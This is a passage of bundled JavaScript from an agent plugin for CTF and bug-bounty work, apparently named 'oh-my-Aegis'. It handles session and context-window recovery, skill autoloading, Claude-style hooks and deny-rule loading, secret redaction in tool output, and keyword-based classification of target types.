        params.notesStore.recordScan(`Session recovery failed: could not load messages (type=${errorType}) session=${info.sessionID}`);
        return;
      }
      const failed = findMessageById(messages, info.messageID);
      if (!failed) {
        params.notesStore.recordScan(`Session recovery failed: message not found (type=${errorType}) session=${info.sessionID} message=${info.messageID}`);
        return;
      }
      if (errorType === "tool_result_missing") {
        const toolUses = extractToolUses(failed.parts);
        if (toolUses.length === 0) {
          params.notesStore.recordScan(`Session recovery failed: no tool_use IDs found (type=${errorType}) session=${info.sessionID} message=${info.messageID}`);
          return;
        }
        const prefix = "[oh-my-Aegis session recovery]";
        const toolResultParts = toolUses.map((t) => {
          const toolLabel = t.name ? `tool=${t.name}` : "tool=unknown";
          const content = state.mode === "BOUNTY" ? `${prefix} Missing tool_result for tool_use_id=${t.id} (${toolLabel}). Do NOT assume it didn't run. Check scope/side-effects before rerun; prefer read-only validation.` : `${prefix} Missing tool_result for tool_use_id=${t.id} (${toolLabel}). Treat as cancelled and continue. Re-run only if needed.`;
          return {
            type: "tool_result",
            tool_use_id: t.id,
            content
          };
        });
        const ok = await callSessionPromptParts(sessionClient, info.sessionID, params.directory, toolResultParts);
        params.notesStore.recordScan(`Session recovery tool_result_missing: injected=${toolUses.length} ok=${ok} session=${info.sessionID} message=${info.messageID}`);
        if (ok) {
          await showToast({
            client: params.client,
            directory: params.directory,
            title: "oh-my-Aegis: session recovered",
            message: "Injected missing tool results. Retry the last step.",
            variant: "success"
          });
        }
        return;
      }
      params.notesStore.recordScan(`Session recovery detected unsupported errorType=${errorType} session=${info.sessionID} message=${info.messageID}`);
    } finally {
      processingByMessageID.delete(info.messageID);
    }
  };
  return { isRecoverableError, handleEvent };
}

// src/recovery/model-id.ts
function parseModelId(model) {
  const trimmed = String(model ?? "").trim();
  const idx = trimmed.indexOf("/");
  if (idx <= 0 || idx === trimmed.length - 1) {
    return { providerID: "unknown", modelID: trimmed };
  }
  return {
    providerID: trimmed.slice(0, idx),
    modelID: trimmed.slice(idx + 1)
  };
}

// src/recovery/context-window-recovery.ts
init_debug_log();
var hasError5 = hasErrorResponse;
async function showToast2(params) {
  const tui = isRecord(params.client) ? params.client.tui : null;
  const toastFn = isRecord(tui) ? tui.showToast : null;
  if (typeof toastFn !== "function")
    return;
  const title = params.title.slice(0, 80);
  const message = params.message.slice(0, 240);
  const duration5 = 3000;
  try {
    await toastFn({
      directory: params.directory,
      title,
      message,
      variant: params.variant,
      duration: duration5
    });
    return;
  } catch (error92) {
    debugLog("ctx-recovery", "showToast primary call failed", error92);
  }
  try {
    await toastFn({
      query: { directory: params.directory },
      body: { title, message, variant: params.variant, duration: duration5 }
    });
  } catch (error92) {
    debugLog("ctx-recovery", "showToast fallback call failed", error92);
  }
}
function extractProviderModelFromMessageUpdated(props) {
  const info = isRecord(props.info) ? props.info : null;
  if (!info)
    return null;
  const providerID = typeof info.providerID === "string" ? info.providerID : "";
  const modelID = typeof info.modelID === "string" ? info.modelID : "";
  if (providerID && modelID)
    return { providerID, modelID };
  return null;
}
function toRatio(value) {
  if (typeof value !== "number" || !Number.isFinite(value)) {
    return null;
  }
  if (value < 0) {
    return null;
  }
  if (value <= 1) {
    return value;
  }
  if (value <= 100) {
    return value / 100;
  }
  return null;
}
function extractContextUsageRatio(props) {
  const info = isRecord(props.info) ? props.info : props;
  const directCandidates = [
    info.contextUsageRatio,
    info.context_window_ratio,
    info.contextWindowUsageRatio,
    info.contextWindowPercent,
    info.contextUsagePercent,
    info.tokenUsageRatio
  ];
  for (const candidate of directCandidates) {
    const ratio = toRatio(candidate);
    if (ratio !== null) {
      return ratio;
    }
  }
  if (isRecord(info.usage)) {
    const usage = info.usage;
    const ratio = toRatio(usage.contextUsageRatio);
    if (ratio !== null) {
      return ratio;
    }
    const total = typeof usage.totalTokens === "number" ? usage.totalTokens : typeof usage.total_tokens === "number" ? usage.total_tokens : null;
    const window = typeof usage.contextWindowTokens === "number" ? usage.contextWindowTokens : typeof usage.context_window_tokens === "number" ? usage.context_window_tokens : null;
    if (typeof total === "number" && typeof window === "number" && window > 0) {
      return Math.max(0, Math.min(1, total / window));
    }
  }
  return null;
}
function getSummarizeFn(client) {
  if (!client || typeof client !== "object")
    return null;
  const session = client.session;
  if (!session || typeof session !== "object")
    return null;
  const fn = session.summarize;
  return typeof fn === "function" ? fn : null;
}
function getPromptAsyncFn(client) {
  if (!client || typeof client !== "object")
    return null;
  const session = client.session;
  if (!session || typeof session !== "object")
    return null;
  const fn = session.promptAsync;
  return typeof fn === "function" ? fn : null;
}
async function callSessionPromptAsync2(params) {
  try {
    const result = await params.promptAsyncFn({
      sessionID: params.sessionID,
      directory: params.directory,
      text: params.prompt,
      source: "oh-my-Aegis.context-budget"
    });
    return !hasError5(result);
  } catch {
    return false;
  }
}
async function callSessionSummarize(params) {
  try {
    const primary = await params.summarizeFn({
      path: { id: params.sessionID },
      body: { providerID: params.providerID, modelID: params.modelID },
      query: { directory: params.directory }
    });
    if (!hasError5(primary))
      return true;
  } catch (error92) {
    debugLog("ctx-recovery", `summarize primary failed session=${params.sessionID}`, error92);
  }
  try {
    const fallback = await params.summarizeFn({
      sessionID: params.sessionID,
      directory: params.directory,
      providerID: params.providerID,
      modelID: params.modelID
    });
    return !hasError5(fallback);
  } catch (error92) {
    debugLog("ctx-recovery", `summarize fallback failed session=${params.sessionID}`, error92);
    return false;
  }
}
async function callSessionMessages2(sessionClient, sessionID, directory, limit) {
  try {
    const primary = await sessionClient.messages({
      path: { id: sessionID },
      query: { directory, limit }
    });
    if (!hasError5(primary) && Array.isArray(primary.data)) {
      return primary.data;
    }
  } catch (error92) {
    debugLog("ctx-recovery", `messages primary failed session=${sessionID}`, error92);
  }
  try {
    const fallback = await sessionClient.messages({ sessionID, directory, limit });
    if (!hasError5(fallback) && Array.isArray(fallback.data)) {
      return fallback.data;
    }
  } catch (error92) {
    debugLog("ctx-recovery", `messages fallback failed session=${sessionID}`, error92);
  }
  return null;
}
function extractLastAssistantProviderModel(messages) {
  let best = null;
  for (const msg of messages) {
    if (!isRecord(msg))
      continue;
    const info = isRecord(msg.info) ? msg.info : null;
    const role = typeof msg.role === "string" ? msg.role : info && typeof info.role === "string" ? String(info.role) : "";
    if (role !== "assistant")
      continue;
    const providerID = info && typeof info.providerID === "string" ? String(info.providerID) : "";
    const modelID = info && typeof info.modelID === "string" ? String(info.modelID) : "";
    if (providerID && modelID) {
      best = { providerID, modelID };
    }
  }
  return best;
}
function createContextWindowRecoveryManager(params) {
  const sessionClient = extractSessionClient(params.client);
  const summarizeFn = getSummarizeFn(params.client);
  const promptAsyncFn = getPromptAsyncFn(params.client);
  const inProgress = new Set;
  const lastAttemptAt = new Map;
  const attemptCount = new Map;
  const proactiveArmed = new Set;
  const shouldAttempt = (sessionID) => {
    const now = Date.now();
    const last = lastAttemptAt.get(sessionID) ?? 0;
    if (now - last < params.config.recovery.context_window_recovery_cooldown_ms) {
      return false;
    }
    const count = attemptCount.get(sessionID) ?? 0;
    if (count >= params.config.recovery.context_window_recovery_max_attempts_per_session) {
      return false;
    }
    return true;
  };
  const recordAttempt = (sessionID) => {
    lastAttemptAt.set(sessionID, Date.now());
    attemptCount.set(sessionID, (attemptCount.get(sessionID) ?? 0) + 1);
  };
  const recover = async (sessionID, summarizeArgs, reason, options) => {
    if (!params.config.recovery.enabled || !params.config.recovery.context_window_recovery)
      return;
    if (!sessionClient || !summarizeFn)
      return;
    if (inProgress.has(sessionID))
      return;
    if (!shouldAttempt(sessionID)) {
      params.notesStore.recordScan(`Context window recovery skipped: budget/cooldown session=${sessionID} reason=${reason}`);
      return;
    }
    if (options?.recordStateEvent) {
      params.store.applyEvent(sessionID, "context_length_exceeded");
      if (params.config.recovery.auto_compact_on_context_failure) {
        const actions = params.notesStore.compactNow();
        for (const action of actions) {
          params.notesStore.recordScan(`Context overflow note compaction: ${action} session=${sessionID}`);
        }
      }
    } else if (typeof options?.proactiveRatio === "number" && params.config.recovery.auto_compact_on_context_failure) {
      const actions = params.notesStore.compactNow();
      for (const action of actions) {
        params.notesStore.recordScan(`Proactive context compaction: ratio=${options.proactiveRatio.toFixed(3)} action=${action} session=${sessionID}`);
      }
    }
    inProgress.add(sessionID);
    recordAttempt(sessionID);
    try {
      await showToast2({
        client: params.client,
        directory: params.directory,
        title: "oh-my-Aegis: context recovery",
        message: "Context limit hit. Summarizing session...",
        variant: "warning"
      });
      const ok = await callSessionSummarize({
        summarizeFn,
        sessionID,
        directory: params.directory,
        providerID: summarizeArgs.providerID,
        modelID: summarizeArgs.modelID
      });
      params.notesStore.recordScan(`Context window recovery attempt: ok=${ok} provider=${summarizeArgs.providerID} model=${summarizeArgs.modelID} session=${sessionID} reason=${reason}`);
      if (ok) {
        if (options?.injectPrompt && promptAsyncFn) {
          const state = params.store.get(sessionID);
          const ratioText = typeof options?.proactiveRatio === "number" ? `${Math.round(options.proactiveRatio * 100)}%` : "high";
          const prompt = [
            "[oh-my-Aegis context-budget]",
            `Context usage reached ${ratioText}; proactive compaction + summarize completed.`,
            "Continue in manager mode: delegate with task subagents and avoid direct execution.",
            "Preserve continuity from durable logs: STATE/WORKLOG/EVIDENCE/CONTEXT_PACK.",
            `Current state: mode=${state.mode} phase=${state.phase} target=${state.targetType}`
          ].join(`
`);
          const injected = await callSessionPromptAsync2({
            promptAsyncFn,
            sessionID,
            directory: params.directory,
            prompt
          });
          params.notesStore.recordScan(`Context budget continuation prompt injected: ok=${injected} session=${sessionID}`);
        }
        await showToast2({
          client: params.client,
          directory: params.directory,
          title: "oh-my-Aegis: context recovered",
          message: "Session summarized. Retry the last step.",
          variant: "success"
        });
      }
    } finally {
      inProgress.delete(sessionID);
    }
  };
  const deriveSummarizeArgs = async (sessionID, props) => {
    const fromUpdated = props ? extractProviderModelFromMessageUpdated(props) : null;
    if (fromUpdated)
      return fromUpdated;
    if (sessionClient) {
      const messages = await callSessionMessages2(sessionClient, sessionID, params.directory, 60);
      if (messages) {
        const last = extractLastAssistantProviderModel(messages);
        if (last)
          return last;
      }
    }
    const model = typeof params.getDefaultModel === "function" ? params.getDefaultModel(sessionID) ?? "" : "";
    const parsed = parseModelId(model);
    return {
      providerID: parsed.providerID,
      modelID: parsed.modelID
    };
  };
  const handleContextFailureText = async (sessionID, text) => {
    if (!params.config.recovery.enabled || !params.config.recovery.context_window_recovery)
      return;
    if (!isContextLengthFailure(text))
      return;
    const summarizeArgs = await deriveSummarizeArgs(sessionID);
    await recover(sessionID, summarizeArgs, "tool.execute.after", { recordStateEvent: false });
  };
  const handleEvent = async (type, props) => {
    if (!params.config.recovery.enabled || !params.config.recovery.context_window_recovery)
      return;
    if (type === "session.error") {
      const sessionID = typeof props.sessionID === "string" ? props.sessionID : "";
      const error92 = props.error;
      const message = extractErrorMessage(error92);
      if (!sessionID || !isContextLengthFailure(message))
        return;
      const summarizeArgs = await deriveSummarizeArgs(sessionID);
      await recover(sessionID, summarizeArgs, "session.error", { recordStateEvent: true });
      return;
    }
    if (type === "message.updated") {
      const info = isRecord(props.info) ? props.info : null;
      if (!info)
        return;
      const sessionID = typeof info.sessionID === "string" ? info.sessionID : "";
      const role = typeof info.role === "string" ? info.role : "";
      const error92 = info.error;
      const message = extractErrorMessage(error92);
      if (!sessionID || role !== "assistant")
        return;
      if (message && isContextLengthFailure(message)) {
        const summarizeArgs2 = await deriveSummarizeArgs(sessionID, props);
        await recover(sessionID, summarizeArgs2, "message.updated", { recordStateEvent: true });
        return;
      }
      if (!params.config.recovery.context_window_proactive_compaction) {
        return;
      }
      const ratio = extractContextUsageRatio(props);
      if (ratio === null) {
        return;
      }
      const threshold = params.config.recovery.context_window_proactive_threshold_ratio;
      const rearm = Math.min(threshold - 0.01, params.config.recovery.context_window_proactive_rearm_ratio);
      if (ratio <= rearm) {
        proactiveArmed.delete(sessionID);
        return;
      }
      if (ratio < threshold || proactiveArmed.has(sessionID)) {
        return;
      }
      proactiveArmed.add(sessionID);
      const summarizeArgs = await deriveSummarizeArgs(sessionID, props);
      await recover(sessionID, summarizeArgs, "message.updated.proactive", {
        recordStateEvent: false,
        proactiveRatio: ratio,
        injectPrompt: true
      });
    }
  };
  return { handleEvent, handleContextFailureText };
}

// src/skills/autoload.ts
import { existsSync as existsSync12, readdirSync as readdirSync3 } from "fs";
import { join as join13 } from "path";
function isNonEmptyString(value) {
  return typeof value === "string" && value.trim().length > 0;
}
function uniqueOrdered(values) {
  const out = [];
  const seen = new Set;
  for (const raw of values) {
    const v = raw.trim();
    if (!v)
      continue;
    if (seen.has(v))
      continue;
    seen.add(v);
    out.push(v);
  }
  return out;
}
function resolveOpencodeDir(environment = process.env) {
  const xdg = environment.XDG_CONFIG_HOME;
  if (xdg && xdg.trim().length > 0) {
    const candidate = join13(xdg, "opencode");
    if (existsSync12(candidate))
      return candidate;
  }
  const home = environment.HOME;
  if (home && home.trim().length > 0) {
    const candidate = join13(home, ".config", "opencode");
    if (existsSync12(candidate))
      return candidate;
  }
  const appData = environment.APPDATA;
  if (process.platform === "win32" && appData && appData.trim().length > 0) {
    const candidate = join13(appData, "opencode");
    if (existsSync12(candidate))
      return candidate;
  }
  return null;
}
function listSkillNames(skillsDir) {
  if (!skillsDir || !existsSync12(skillsDir)) {
    return [];
  }
  try {
    const entries = readdirSync3(skillsDir, { withFileTypes: true });
    const out = [];
    for (const entry of entries) {
      if (!entry.isDirectory())
        continue;
      const name = entry.name;
      if (!name || name.startsWith("."))
        continue;
      const skillPath = join13(skillsDir, name, "SKILL.md");
      if (!existsSync12(skillPath))
        continue;
      out.push(name);
    }
    return out;
  } catch {
    return [];
  }
}
function discoverAvailableSkills(projectDir, environment = process.env) {
  const out = new Set;
  const opencodeDir = resolveOpencodeDir(environment);
  const candidates = [
    opencodeDir ? join13(opencodeDir, "skills") : "",
    join13(projectDir, ".opencode", "skills"),
    join13(projectDir, ".claude", "skills")
  ].filter(Boolean);
  for (const dir of candidates) {
    for (const name of listSkillNames(dir)) {
      out.add(name);
    }
  }
  return out;
}
function phaseKey(phase) {
  if (phase === "SCAN")
    return "scan";
  if (phase === "PLAN")
    return "plan";
  return "execute";
}
function normalizeSkillList(input) {
  const raw = [];
  if (Array.isArray(input)) {
    for (const item of input) {
      if (isNonEmptyString(item))
        raw.push(item);
    }
  } else if (isNonEmptyString(input)) {
    raw.push(input);
  }
  return uniqueOrdered(raw);
}
function filterAvailable(skills, availableSkills) {
  if (availableSkills.size === 0) {
    return skills;
  }
  return skills.filter((name) => availableSkills.has(name));
}
function resolveAutoloadSkills(params) {
  const cfg = params.config.skill_autoload;
  if (!cfg.enabled)
    return [];
  const modeKey = params.state.mode === "CTF" ? "ctf" : "bounty";
  const phase = phaseKey(params.state.phase);
  const target = params.state.targetType;
  const baseSubagent = baseAgentName(params.subagentType);
  const bySubagent = cfg.by_subagent[baseSubagent] ?? [];
  const baseList = cfg[modeKey][phase][target] ?? [];
  return filterAvailable(normalizeSkillList([...baseList, ...bySubagent]), params.availableSkills);
}
function mergeLoadSkills(params) {
  const existing = normalizeSkillList(params.existing);
  const autoload = filterAvailable(normalizeSkillList(params.autoload), params.availableSkills);
  const cap = Number.isFinite(params.maxSkills) ? params.maxSkills : 0;
  if (cap <= 0) {
    return existing;
  }
  if (existing.length >= cap) {
    return existing;
  }
  const remaining = cap - existing.length;
  const seen = new Set(existing);
  const extras = [];
  for (const name of autoload) {
    if (seen.has(name))
      continue;
    seen.add(name);
    extras.push(name);
    if (extras.length >= remaining)
      break;
  }
  return existing.concat(extras);
}

// src/hooks/claude-compat.ts
import { existsSync as existsSync13, statSync as statSync5 } from "fs";
import { join as join14 } from "path";
import { spawn as spawn2 } from "child_process";
function isFile(path) {
  try {
    return statSync5(path).isFile();
  } catch {
    return false;
  }
}
function truncate2(text, maxChars) {
  if (text.length <= maxChars)
    return text;
  return `${text.slice(0, maxChars)}
... [truncated]`;
}
async function runClaudeHook(params) {
  const hooksDir = join14(params.projectDir, ".claude", "hooks");
  const candidates = [
    join14(hooksDir, `${params.hookName}.sh`),
    join14(hooksDir, `${params.hookName}.bash`)
  ];
  const script = candidates.find((p) => existsSync13(p) && isFile(p));
  if (!script) {
    return { ok: true };
  }
  const input = `${JSON.stringify(params.payload)}
`;
  const proc = spawn2("bash", [script], {
    cwd: params.projectDir,
    stdio: ["pipe", "pipe", "pipe"]
  });
  const maxWaitMs = Math.max(10, params.timeoutMs);
  try {
    proc.stdin.end(input);
  } catch (error92) {
    try {
      proc.stdin.end();
    } catch (endError) {}
  }
  const stdoutChunks = [];
  const stderrChunks = [];
  proc.stdout?.on("data", (chunk) => {
    stdoutChunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  });
  proc.stderr?.on("data", (chunk) => {
    stderrChunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  });
  const exited = new Promise((resolveExit) => {
    proc.once("close", (code) => {
      resolveExit({ code: typeof code === "number" ? code : 1, error: null, timedOut: false });
    });
    proc.once("error", (error92) => {
      resolveExit({ code: 127, error: error92 instanceof Error ? error92 : new Error(String(error92)), timedOut: false });
    });
  });
  const timed = new Promise((resolveTimeout) => {
    const timer = setTimeout(() => {
      try {
        proc.kill();
      } catch (error92) {}
      resolveTimeout({ code: 124, error: null, timedOut: true });
    }, maxWaitMs);
    proc.once("close", () => clearTimeout(timer));
    proc.once("error", () => clearTimeout(timer));
  });
  const exit = await Promise.race([exited, timed]);
  const stdout = Buffer.concat(stdoutChunks).toString("utf-8");
  const stderr = Buffer.concat(stderrChunks).toString("utf-8");
  if (exit.error) {
    const errno = exit.error;
    if (errno.code === "ENOENT") {
      return { ok: true };
    }
    return {
      ok: false,
      reason: `Claude hook ${params.hookName} failed to spawn bash: ${exit.error.message}`
    };
  }
  if (exit.timedOut) {
    return {
      ok: false,
      reason: `Claude hook ${params.hookName} timed out after ${maxWaitMs}ms.`
    };
  }
  const exitCode = exit.code;
  if (exitCode === 0) {
    return { ok: true };
  }
  const msg = [
    `Claude hook ${params.hookName} denied (exit=${exitCode})`,
    stderr.trim() ? `stderr: ${truncate2(stderr.trim(), 1200)}` : "",
    stdout.trim() ? `stdout: ${truncate2(stdout.trim(), 1200)}` : ""
  ].filter(Boolean).join(`
`);
  return { ok: false, reason: msg };
}

// src/helpers/plugin-utils.ts
import { existsSync as existsSync14, readFileSync as readFileSync11 } from "fs";
import { isAbsolute as isAbsolute4, join as join15, relative as relative3, resolve as resolve5 } from "path";
function detectDockerParityRequirement(workdir) {
  const candidates = [
    join15(workdir, "README.md"),
    join15(workdir, "readme.md"),
    join15(workdir, "Dockerfile"),
    join15(workdir, "docker", "README.md")
  ];
  const mustRunInDocker = /(?:must|should|required|need(?:ed)?)\s+(?:to\s+)?run\s+in\s+docker|docker\s+only|run\s+with\s+docker/i;
  for (const path of candidates) {
    if (!existsSync14(path))
      continue;
    try {
      const raw = readFileSync11(path, "utf-8");
      if (mustRunInDocker.test(raw)) {
        return {
          required: true,
          reason: `Docker parity required by ${relative3(workdir, path)}`
        };
      }
    } catch {
      continue;
    }
  }
  return { required: false, reason: "" };
}

class AegisPolicyDenyError extends Error {
  constructor(message) {
    super(message);
    this.name = "AegisPolicyDenyError";
  }
}
function escapeRegExp(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}
function normalizePathForMatch(path) {
  return path.replace(/\\/g, "/");
}
function globToRegExp(glob) {
  const normalized = normalizePathForMatch(glob);
  let pattern = "^";
  for (let i = 0;i < normalized.length; ) {
    const ch = normalized[i];
    if (ch === "*") {
      if (normalized[i + 1] === "*") {
        if (normalized[i + 2] === "/") {
          pattern += "(?:.*\\/)?";
          i += 3;
          continue;
        }
        pattern += ".*";
        i += 2;
        continue;
      }
      pattern += "[^/]*";
      i += 1;
      continue;
    }
    if (ch === "?") {
      pattern += "[^/]";
      i += 1;
      continue;
    }
    pattern += escapeRegExp(ch);
    i += 1;
  }
  pattern += "$";
  return new RegExp(pattern);
}
function normalizeToolName(value) {
  return value.replace(/[^a-z0-9_-]+/gi, "_").slice(0, 64);
}
function maskSensitiveToolOutput(text) {
  const patterns = [
    /\b(authorization\s*:\s*bearer\s+)([^\s\r\n]+)/gi,
    /\b(x-api-key\s*:\s*)([^\s\r\n]+)/gi,
    /\b(api[_-]?key\s*[=:]\s*)([^\s\r\n]+)/gi,
    /\b(client[_-]?secret\s*[=:]\s*)([^\s\r\n]+)/gi,
    /\b(access[_-]?token\s*[=:]\s*)([^\s\r\n]+)/gi,
    /\b(refresh[_-]?token\s*[=:]\s*)([^\s\r\n]+)/gi,
    /\b(session[_-]?id\s*[=:]\s*)([^\s\r\n]+)/gi,
    /\b(cookie\s*:\s*)([^\r\n]+)/gi,
    /\bset-cookie\s*:\s*([^\r\n]+)/gi,
    /\b(password\s*[=:]\s*)([^\s\r\n]+)/gi
  ];
  let out = text;
  for (const pattern of patterns) {
    out = out.replace(pattern, (_match, prefix) => `${prefix}[REDACTED]`);
  }
  return out;
}
function isPathInsideRoot(path, root) {
  const resolvedPath = resolve5(path);
  const resolvedRoot = resolve5(root);
  const rel = relative3(resolvedRoot, resolvedPath);
  if (!rel)
    return true;
  return !rel.startsWith("..") && !isAbsolute4(rel);
}
function truncateWithHeadTail(text, headChars, tailChars) {
  const safeHead = Math.max(0, Math.floor(headChars));
  const safeTail = Math.max(0, Math.floor(tailChars));
  if (text.length <= safeHead + safeTail + 64) {
    return text;
  }
  const head = text.slice(0, safeHead);
  const tail = safeTail > 0 ? text.slice(-safeTail) : "";
  return `${head}

... [truncated] ...

${tail}`;
}
function extractArtifactPathHints(text) {
  const normalized = text.replace(/\\/g, "/");
  const pathLikeRe = /(?:\.?\/?[A-Za-z0-9_\-.]+(?:\/[A-Za-z0-9_\-.]+)+\.(?:txt|log|json|md|yml|yaml|out|bin|elf|dump|pcap|pcapng|png|jpg|jpeg|gif|zip|tar|gz))/g;
  const matches = normalized.match(pathLikeRe) ?? [];
  const filtered = matches.map((item) => item.trim()).filter((item) => item.length > 3).filter((item) => !item.startsWith("http://") && !item.startsWith("https://"));
  return [...new Set(filtered)].slice(0, 20);
}
function isAegisManagerDelegationTool(toolName) {
  if (toolName === "task" || toolName === "todowrite") {
    return true;
  }
  if (toolName === "background_output" || toolName === "background_cancel") {
    return true;
  }
  if (toolName.startsWith("ctf_orch_") || toolName.startsWith("ctf_parallel_")) {
    return true;
  }
  if (toolName === "ctf_subagent_dispatch") {
    return true;
  }
  return false;
}
function inProgressTodoCount(args) {
  if (!isRecord(args)) {
    return 0;
  }
  const candidate = args.todos;
  if (!Array.isArray(candidate)) {
    return 0;
  }
  let count = 0;
  for (const todo of candidate) {
    if (!isRecord(todo)) {
      continue;
    }
    if (todo.status === "in_progress") {
      count += 1;
    }
  }
  return count;
}
function todoStatusCounts(todos) {
  let pending = 0;
  let inProgress = 0;
  let completed = 0;
  for (const todo of todos) {
    if (!isRecord(todo)) {
      continue;
    }
    const status = typeof todo.status === "string" ? todo.status : "";
    if (status === "pending")
      pending += 1;
    if (status === "in_progress")
      inProgress += 1;
    if (status === "completed")
      completed += 1;
  }
  return {
    pending,
    inProgress,
    completed,
    open: pending + inProgress
  };
}
var SYNTHETIC_START_TODO = "Start the next concrete TODO step.";
var SYNTHETIC_CONTINUE_TODO = "Continue with the next TODO after updating the completed step.";
var SYNTHETIC_BREAKDOWN_PREFIX = "Break down remaining work into smaller TODO #";
function todoContent(todo) {
  if (!todo || typeof todo !== "object" || Array.isArray(todo)) {
    return "";
  }
  const record3 = todo;
  return typeof record3.content === "string" ? record3.content : "";
}
function isSyntheticTodoContent(content) {
  return content === SYNTHETIC_START_TODO || content === SYNTHETIC_CONTINUE_TODO || content.startsWith(SYNTHETIC_BREAKDOWN_PREFIX);
}
function textFromParts(parts) {
  return parts.map((part) => {
    if (!part || typeof part !== "object") {
      return "";
    }
    const data = part;
    if (data.type !== "text") {
      return "";
    }
    return typeof data.text === "string" ? data.text : "";
  }).join(`
`).trim();
}
function textFromUnknown(value) {
  if (!value || typeof value !== "object") {
    return "";
  }
  const data = value;
  const chunks = [];
  const keys = ["text", "content", "prompt", "input", "message", "query", "goal", "description"];
  for (const key of keys) {
    const item = data[key];
    if (typeof item === "string" && item.trim().length > 0) {
      chunks.push(item);
      continue;
    }
    if (!item || typeof item !== "object") {
      continue;
    }
    const nested = item;
    if (typeof nested.text === "string" && nested.text.trim().length > 0) {
      chunks.push(nested.text);
    }
    if (typeof nested.content === "string" && nested.content.trim().length > 0) {
      chunks.push(nested.content);
    }
  }
  return chunks.join(`
`);
}
function detectTargetType(text) {
  const lower = text.toLowerCase();
  if (/(\bweb3\b|smart contract|solidity|evm|ethereum|foundry|hardhat|slither|reentrancy|erc20|defi|onchain|bridge)/i.test(lower)) {
    return "WEB3";
  }
  if (/(\bweb\b|\bapi\b|http|graphql|rest|websocket|grpc|idor|xss|sqli)/i.test(lower))
    return "WEB_API";
  if (/(\bpwn\b|heap|rop|shellcode|gdb|pwntools|format string|use-after-free)/i.test(lower))
    return "PWN";
  if (/(\brev\b|reverse|decompile|ghidra|ida|radare|disasm|elf|packer)/i.test(lower))
    return "REV";
  if (/(\bcrypto\b|cipher|rsa|aes|hash|ecc|curve|lattice|padding oracle)/i.test(lower))
    return "CRYPTO";
  if (/(\bforensics\b|pcap|pcapng|disk image|memory dump|volatility|wireshark|evtx|mft|registry hive|timeline|carv)/i.test(lower)) {
    return "FORENSICS";
  }
  if (/(\bmisc\b|steg|osint|encoding|puzzle|logic)/i.test(lower))
    return "MISC";
  return null;
}

// src/helpers/claude-rules-cache.ts
import { existsSync as existsSync15, readFileSync as readFileSync12, readdirSync as readdirSync4, statSync as statSync6 } from "fs";
import { join as join16, relative as relative4, resolve as resolve6 } from "path";
class ClaudeRulesCache {
  directory;
  denyCache = {
    lastLoadAt: 0,
    sourceMtimeMs: 0,
    sourcePaths: [],
    denyBash: [],
    denyRead: [],
    denyEdit: [],
    warnings: []
  };
  rulesCache = {
    lastLoadAt: 0,
    sourceMtimeMs: 0,
    rules: [],
    warnings: []
  };
  constructor(directory) {
    this.directory = directory;
  }
  getDenyRules() {
    const now = Date.now();
    if (now - this.denyCache.lastLoadAt < 60000) {
      return this.denyCache;
    }
    this.loadDenyRules();
    return this.denyCache;
  }
  getRules() {
    const now = Date.now();
    if (now - this.rulesCache.lastLoadAt < 60000) {
      return this.rulesCache;
    }
    this.loadRules();
    return this.rulesCache;
  }
  loadDenyRules() {
    const settingsDir = join16(this.directory, ".claude");
    const candidates = [
      join16(settingsDir, "settings.json"),
      join16(settingsDir, "settings.local.json")
    ];
    const sourcePaths = candidates.filter((p) => existsSync15(p));
    let sourceMtimeMs = 0;
    for (const p of sourcePaths) {
      try {
        const st = statSync6(p);
        sourceMtimeMs = Math.max(sourceMtimeMs, st.mtimeMs);
      } catch {
        continue;
      }
    }
    const denyStrings = [];
    const warnings = [];
    const collectDeny = (path) => {
      let raw = "";
      try {
        raw = readFileSync12(path, "utf-8");
      } catch {
        warnings.push(`Failed to read Claude settings: ${relative4(this.directory, path)}`);
        return;
      }
      let parsed;
      try {
        parsed = JSON.parse(raw);
      } catch {
        warnings.push(`Failed to parse Claude settings JSON: ${relative4(this.directory, path)}`);
        return;
      }
      if (!isRecord(parsed)) {
        warnings.push(`Claude settings root is not an object: ${relative4(this.directory, path)}`);
        return;
      }
      const permissions = parsed.permissions;
      if (!isRecord(permissions)) {
        return;
      }
      const deny = permissions.deny;
      if (!Array.isArray(deny)) {
        return;
      }
      for (const entry of deny) {
        if (typeof entry === "string" && entry.trim().length > 0) {
          denyStrings.push(entry.trim());
        }
      }
    };
    for (const p of sourcePaths) {
      collectDeny(p);
    }
    const denyBash = [];
    const denyRead = [];
    const denyEdit = [];
    const toAbsPathGlob = (spec) => {
      const trimmed = spec.trim();
      if (!trimmed)
        return null;
      if (trimmed.startsWith("//")) {
        return resolve6("/", trimmed.slice(2));
      }
      if (trimmed.startsWith("~")) {
        const home = process.env.HOME || process.env.USERPROFILE;
        if (!home)
          return null;
        return resolve6(home, trimmed.slice(1));
      }
      if (trimmed.startsWith("/")) {
        return resolve6(settingsDir, trimmed.slice(1));
      }
      if (trimmed.startsWith("./")) {
        return resolve6(this.directory, trimmed.slice(2));
      }
      return resolve6(this.directory, trimmed);
    };
    for (const item of denyStrings) {
      const match = item.match(/^(Read|Edit|Bash)\((.*)\)$/);
      if (!match) {
        continue;
      }
      const kind = match[1];
      const spec = match[2] ?? "";
      if (kind === "Bash") {
        const escaped = escapeRegExp(spec);
        const re2 = new RegExp(`^${escaped.replace(/\\\*/g, ".*").replace(/\\\?/g, ".")}$`, "i");
        denyBash.push({ raw: item, re: re2 });
        continue;
      }
      const absGlob = toAbsPathGlob(spec);
      if (!absGlob) {
        continue;
      }
      let re;
      try {
        re = globToRegExp(absGlob);
      } catch {
        continue;
      }
      if (kind === "Read") {
        denyRead.push({ raw: item, re });
      } else {
        denyEdit.push({ raw: item, re });
      }
    }
    this.denyCache.lastLoadAt = Date.now();
    this.denyCache.sourceMtimeMs = sourceMtimeMs;
    this.denyCache.sourcePaths = sourcePaths;
    this.denyCache.denyBash = denyBash;
    this.denyCache.denyRead = denyRead;
    this.denyCache.denyEdit = denyEdit;
    this.denyCache.warnings = warnings;
  }
  loadRules() {
    const rulesDir = join16(this.directory, ".claude", "rules");
    const warnings = [];
    const rules = [];
    let sourceMtimeMs = 0;
    if (!existsSync15(rulesDir)) {
      this.rulesCache.lastLoadAt = Date.now();
      this.rulesCache.sourceMtimeMs = 0;
      this.rulesCache.rules = [];
      this.rulesCache.warnings = [];
      return;
    }
    const mdFiles = [];
    const walk = (dir, depth) => {
      if (depth > 12)
        return;
      let entries = [];
      try {
